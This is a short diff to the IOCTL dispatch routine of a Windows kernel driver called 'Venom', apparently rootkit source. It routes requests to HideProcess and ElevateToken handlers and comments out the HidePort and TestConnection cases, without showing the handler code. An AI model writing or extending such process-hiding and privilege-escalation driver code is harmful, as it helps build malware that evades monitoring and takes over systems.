@@ -1,6 +1,5 @@
-#include "IoctlHandlers.h"
-#include <ntddk.h>
 #include "Venom.h"
+#include "IoctlHandlers.h"
 #include "Ioctl.h"
 
 // Prototypes
@@ -71,20 +70,20 @@ NTSTATUS VenomDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 		status = IoctlHandlers::HideProcess(Irp);
 		break;
 
-	case VenomIoctls::TestConnection:
+	/*case VenomIoctls::TestConnection:
 
 		status = IoctlHandlers::TestConnection(Irp, stack->Parameters.DeviceIoControl.OutputBufferLength);
-		break;
+		break;*/
 
 	case VenomIoctls::Elevate:
 
 		status = IoctlHandlers::ElevateToken(Irp);
 		break;
 
-	case VenomIoctls::HidePort:
+	/*case VenomIoctls::HidePort:
 
 		status = IoctlHandlers::HidePort(Irp);
-		break;
+		break;*/
 	default:
 		Irp->IoStatus.Information = 0;
 		status = STATUS_INVALID_DEVICE_REQUEST;
